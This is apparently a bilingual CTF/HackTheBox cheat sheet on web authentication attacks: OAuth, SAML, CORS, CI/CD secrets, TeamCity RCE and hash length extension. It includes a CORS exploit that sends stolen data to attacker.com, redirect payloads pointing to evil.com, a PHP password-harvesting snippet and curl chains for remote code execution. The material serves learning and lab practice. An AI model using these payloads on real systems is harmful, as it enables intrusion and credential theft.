# CTF Web - OAuth, SAML & Infrastructure Auth Attacks

## Table of Contents
- [OAuth/OIDC 利用](#oauthoidc-exploitation)
  - [开放重定向窃取 Token](#open-redirect-token-theft)
  - [OIDC ID Token 篡改](#oidc-id-token-manipulation)
  - [OAuth State 参数 CSRF](#oauth-state-parameter-csrf)
- [CORS 配置错误](#cors-misconfiguration)
- [Git 历史凭据泄露（Barrier HTB）](#git-history-credential-leakage-barrier-htb)
- [CI/CD 变量凭据窃取（Barrier HTB）](#cicd-variable-credential-theft-barrier-htb)
- [身份提供商 API 接管（Barrier HTB）](#identity-provider-api-takeover-barrier-htb)
- [SAML SSO 流程自动化（Barrier HTB）](#saml-sso-flow-automation-barrier-htb)
- [Apache Guacamole 连接参数提取（Barrier HTB）](#apache-guacamole-connection-parameter-extraction-barrier-htb)
- [登录页投毒窃取凭据（Watcher HTB）](#login-page-poisoning-for-credential-harvesting-watcher-htb)
- [TeamCity REST API RCE（Watcher HTB）](#teamcity-rest-api-rce-watcher-htb)
- [宽松 Base64 解码与参数覆盖导致签名绕过（BCTF 2016）](#base64-decode-leniency-and-parameter-override-for-signature-bypass-bctf-2016)
- [哈希长度扩展攻击（ASIS CTF 2017）](#hash-length-extension-attack-asis-ctf-2017)

JWT/JWE token 攻击见 [auth-jwt.md](auth-jwt.md)。一般认证绕过与访问控制见 [auth-and-access.md](auth-and-access.md)。

---

## OAuth/OIDC Exploitation

### Open Redirect Token Theft
```python
# OAuth authorization with redirect_uri manipulation
# If redirect_uri validation is weak, steal tokens via open redirect
import requests

# Step 1: Craft malicious authorization URL
auth_url = "https://target.com/oauth/authorize"
params = {
    "client_id": "legitimate_client",
    "redirect_uri": "https://target.com/callback/../@attacker.com",  # path traversal
    "response_type": "code",
    "scope": "openid profile"
}
# Victim clicks → auth code sent to attacker's server

# Common redirect_uri bypasses:
# https://target.com/callback?next=https://evil.com
# https://target.com/callback/../@evil.com
# https://target.com/callback%23@evil.com  (fragment)
# https://target.com/callback/.evil.com
# https://target.com.evil.com  (subdomain)
```

### OIDC ID Token Manipulation
```python
# If server accepts unsigned tokens (alg: none)
import jwt, json, base64

token = "eyJ..."  # captured ID token
header, payload, sig = token.split(".")
# Decode and modify
payload_data = json.loads(base64.urlsafe_b64decode(payload + "=="))
payload_data["sub"] = "admin"
payload_data["email"] = "admin@target.com"

# Re-encode with alg:none
new_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=")
new_payload = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).rstrip(b"=")
forged = f"{new_header.decode()}.{new_payload.decode()}."
```

### OAuth State Parameter CSRF
```python
# Missing or predictable state parameter allows CSRF
# Attacker initiates OAuth flow, captures callback URL with auth code
# Sends callback URL to victim → victim's session linked to attacker's OAuth account

# Detection: Check if state parameter is:
# 1. Present in authorization request
# 2. Validated on callback
# 3. Bound to user session (not just random)
```

**关键点：** OAuth/OIDC（OpenID Connect）攻击通常围绕三类问题：`redirect_uri` 校验薄弱（开放重定向 -> token 窃取）、token 篡改（`alg:none`、JWKS 注入）以及 state 参数 CSRF。始终测试 `redirect_uri` 的路径遍历、fragment 注入和子域名技巧。

---

## CORS Misconfiguration

```python
# Test for reflected Origin
import requests

targets = [
    "https://evil.com",
    "https://target.com.evil.com",
    "null",
    "https://target.com%60.evil.com",
]

for origin in targets:
    r = requests.get("https://target.com/api/sensitive",
                     headers={"Origin": origin})
    acao = r.headers.get("Access-Control-Allow-Origin", "")
    acac = r.headers.get("Access-Control-Allow-Credentials", "")
    if origin in acao or acao == "*":
        print(f"[!] Reflected: {origin} -> ACAO: {acao}, ACAC: {acac}")
```

```javascript
// Exploit: steal data via CORS misconfiguration
// Host on attacker server, victim visits this page
fetch('https://target.com/api/user/profile', {
    credentials: 'include'
}).then(r => r.json()).then(data => {
    fetch('https://attacker.com/steal?data=' + btoa(JSON.stringify(data)));
});
```

**关键点：** 当 `Access-Control-Allow-Origin` 反射 `Origin`，同时又设置 `Access-Control-Allow-Credentials: true` 时，CORS（Cross-Origin Resource Sharing）即可被利用。重点检查子域匹配错误（`*.target.com` 错收 `evil-target.com`）、接受 `null` origin（`sandbox` iframe）以及前缀/后缀匹配 bug。

---

## Git History Credential Leakage (Barrier HTB)

后续提交里删除的 secrets 仍会留在 git 历史中。遍历完整 diff 历史搜索已删除凭据：
```bash
git log --all --oneline
git show <first_commit>
# Search all history for a keyword across all branches:
git log -p --all -S "password"
```

**关键点：** `git log -p --all -S "keyword"` 会在所有分支的每个提交 diff 中搜索指定字符串，包括已经删除的秘密。始终检查首个提交和被删除的文件。

---

## CI/CD Variable Credential Theft (Barrier HTB)

CI/CD（Continuous Integration/Continuous Deployment）变量配置中通常存有 secrets（API token、密码），项目管理员可读。这些变量往往是连接服务的高权限 token（authentik、Vault、AWS 等）。
```bash
# GitLab: Settings -> CI/CD -> Variables (visible to project admins)
# GitHub: Settings -> Secrets and variables -> Actions
# Jenkins: Manage Jenkins -> Credentials
```

**关键点：** CI/CD 变量里经常包含高权限服务账号 token。GitLab 项目管理员能读取全部 CI/CD 变量，其中可能包含身份提供商、秘密管理系统或云平台的访问凭据。

---

## Identity Provider API Takeover (Barrier HTB)

利用身份提供商（authentik、Keycloak、Okta 等）的管理员 API token，接管任意用户账号。

**攻击链：**
1. 枚举用户：`GET /api/v3/core/users/`
2. 重置目标用户密码：`POST /api/v3/core/users/{pk}/set_password/`
3. 检查认证流程阶段；若 MFA（Multi-Factor Authentication）设置为 `not_configured_action: skip`，则在未配置 MFA 设备时会自动跳过
4. 按流程逐步认证（GET 启动阶段，POST 提交，跟随 302）

**关键点：** 身份提供商的管理员 token 基本等同全局总钥匙。若 MFA 阶段配置了 `not_configured_action: skip`，那么仅靠改密码就足以完全接管账号，无需额外绕过 MFA。

---

## SAML SSO Flow Automation (Barrier HTB)

当你掌握 IdP（Identity Provider）凭据时，可自动化 SAML（Security Assertion Markup Language）SSO 登录到 Guacamole 或内部应用等服务。

**步骤：**
1. 从目标服务发起登录流程，抓取跳转中的 `SAMLRequest` 与 `RelayState`
2. 向 IdP 完成认证（通过 API 或已有会话）
3. 把 IdP 签名后的 `SAMLResponse` 与原始 `RelayState` 提交到服务回调端点
4. 从 state 参数跳转中取出认证 token

**关键点：** 整个流程中必须保留 `RelayState`，它用来把回调与初始登录请求关联起来。即使 `SAMLResponse` 有效，只要 `RelayState` 不匹配，认证也会失败。

---

## Apache Guacamole Connection Parameter Extraction (Barrier HTB)

Apache Guacamole 会把 SSH key、密码和连接细节存进 MySQL。拿到数据库权限或已认证 API token 后即可提取：
```bash
# Via API with auth token
curl "http://TARGET:8080/guacamole/api/session/data/mysql/connections/1/parameters?token=$TOKEN"
# Returns: hostname, port, username, private-key, passphrase
```

```sql
-- Via MySQL directly
SELECT c.connection_name, cp.parameter_name, cp.parameter_value
FROM guacamole_connection c
JOIN guacamole_connection_parameter cp ON c.connection_id = cp.connection_id;
```

**关键点：** Guacamole 连接参数中往往直接包含明文 SSH 私钥与口令。一个 API token 或数据库访问权限，就足以暴露其管理的全部主机凭据。

---

## Login Page Poisoning for Credential Harvesting (Watcher HTB)

向 Web 应用登录页注入凭据记录逻辑，捕获明文密码：
```php
// Add after successful login check in index.php:
$f = fopen('/dev/shm/creds.txt', 'a+');
fputs($f, "{$_POST['name']}:{$_POST['password']}\n");
fclose($f);
```

等待自动化登录（机器人、定时任务）。结合审计日志查看高频登录用户，他们往往使用了硬编码的高权限凭据。

**关键点：** `/dev/shm/` 是基于 tmpfs 的内存文件系统，通常所有用户可写，且不易被常规监控发现。自动化服务（备份脚本、健康检查）常在固定时间用高权限账号登录，适合被动收集。

---

## TeamCity REST API RCE (Watcher HTB)

拿到 TeamCity 管理员凭据后，可通过注入构建步骤实现 RCE（Remote Code Execution）：
```bash
# 1. Create project
curl -X POST 'http://HOST:8111/httpAuth/app/rest/projects' \
  -u 'USER:PASS' -H 'Content-Type: application/xml' \
  -d '<newProjectDescription name="pwn" id="pwn"><parentProject locator="id:_Root"/></newProjectDescription>'

# 2. Create build config
curl -X POST 'http://HOST:8111/httpAuth/app/rest/projects/pwn/buildTypes' \
  -u 'USER:PASS' -H 'Content-Type: application/xml' \
  -d '<newBuildTypeDescription name="rce" id="rce"><project id="pwn"/></newBuildTypeDescription>'

# 3. Add command-line build step
curl -X POST 'http://HOST:8111/httpAuth/app/rest/buildTypes/id:rce/steps' \
  -u 'USER:PASS' -H 'Content-Type: application/xml' \
  -d '<step name="cmd" type="simpleRunner"><properties>
    <property name="script.content" value="cat /root/root.txt"/>
    <property name="use.custom.script" value="true"/>
  </properties></step>'

# 4. Trigger build
curl -X POST 'http://HOST:8111/httpAuth/app/rest/buildQueue' \
  -u 'USER:PASS' -H 'Content-Type: application/xml' \
  -d '<build><buildType id="rce"/></build>'

# 5. Read build log for output
curl 'http://HOST:8111/httpAuth/downloadBuildLog.html?buildId=ID' -u 'USER:PASS'
```

**关键点：** 若构建代理以 root 身份运行，则所有构建步骤都以 root 执行。可先用 `ps aux` 确认构建代理进程属主。TeamCity REST API 允许完整管理项目和构建，因此管理员凭据基本等同 RCE。

---

## Base64 Decode Leniency and Parameter Override for Signature Bypass (BCTF 2016)

服务端会对订单字符串做 RSA 签名，然后再解析 `&` 分隔参数。Python 的 `b64decode()` 会静默忽略非 base64 字符。把 `&price=0` 直接附在 base64 签名后即可同时利用这两点：

```python
# Original signed order: "item=widget&price=100"
# Server returns: base64(RSA_sign(order)) as signature

# Attack: append &price=0 after the signature
# b64decode("VALID_SIG_BASE64&price=0") silently ignores "&price=0"
# But the parameter parser sees: item=widget&price=100&price=0
# Last value wins: price=0
```

**关键点：** 漏洞来自“被签名的数据”和“真正被解析的数据”不一致，再叠加 base64 对非字母表字符的宽容处理。任何把已签名数据与未签名参数拼接，并用宽松 base64 解码的系统都存在风险。防御应对“实际要解析的完整字节串”做签名校验，而不是只校验其中一部分。

---

## Hash Length Extension Attack (ASIS CTF 2017)

*同类原语的标准密码学说明见 [ctf-crypto/modern-ciphers-2.md — Hash Length Extension Attack (PlaidCTF 2014)](../ctf-crypto/modern-ciphers-2.md#hash-length-extension-attack-plaidctf-2014)。*

**模式：** 当 Merkle-Damgård 哈希函数（MD5、SHA-1、SHA-256）被用于 `MAC = H(secret || message)` 时，会受到长度扩展攻击。只要知道 `H(secret || message)` 以及 `secret` 长度，攻击者即可在不知道 secret 的情况下计算 `H(secret || message || padding || extension)`。原摘要结束时的内部哈希状态已经足够继续追加计算。

```python
# Vulnerable MAC construction:
import hashlib
mac = hashlib.sha256(secret + message).hexdigest()
# Server sends: mac + message to client, verifies by recomputing H(secret || message)

# Attack: extend the message without knowing the secret
# hashpumpy does the heavy lifting:
import hashpumpy

original_mac = "a1b2c3..."     # known hash
original_msg = b"user=alice"   # known message
secret_len   = 16              # known or brute-forced (try 1-100)
extension    = b"&admin=true"  # data to append

new_mac, new_msg = hashpumpy.hashpump(
    original_mac,   # original hexdigest
    original_msg,   # original data (without secret)
    extension,      # data to append
    secret_len      # secret length
)

# new_msg = original_msg + padding + extension
# new_mac = valid H(secret || new_msg) without knowing secret
```

```bash
# Alternative: hash_extender tool
hash_extender \
    --data "user=alice" \
    --secret-min 1 --secret-max 50 \
    --append "&admin=true" \
    --signature "a1b2c3..." \
    --format sha256

# Or: manual Python with hashpumpy, brute-force secret length
for length in range(1, 101):
    new_mac, new_msg = hashpumpy.hashpump(orig_mac, orig_msg, extension, length)
    r = requests.get(url, params={"data": new_msg.hex(), "mac": new_mac})
    if "success" in r.text:
        print(f"Secret length: {length}, Flag: {r.text}")
        break
```

**填充结构：** 原消息与扩展数据之间，哈希算法会插入标准 padding：
```text
original_msg || 0x80 || 0x00...0x00 || length_in_bits (8 bytes big-endian)
```
这个 padding 本身就是 `new_msg` 的一部分，服务端会按原样参与校验。

**受影响算法：** MD5、SHA-1、SHA-224、SHA-256、SHA-384、SHA-512（都属于 Merkle-Damgård）。**不受影响：** HMAC（双层哈希）、SHA-3/Keccak（海绵结构）、BLAKE2/3。

**关键点：** 只要把 Merkle-Damgård 哈希直接当作 `H(secret || data)` 使用，而不是使用 HMAC，就会在消息边界泄露内部状态，从而允许任意扩展。优先用 `hashpumpy` 或 `hash_extender`。若不知道 secret 长度，可直接爆破，CTF 中 1 到 100 通常够用；一旦长度猜对，服务端就会接受伪造后的 MAC。
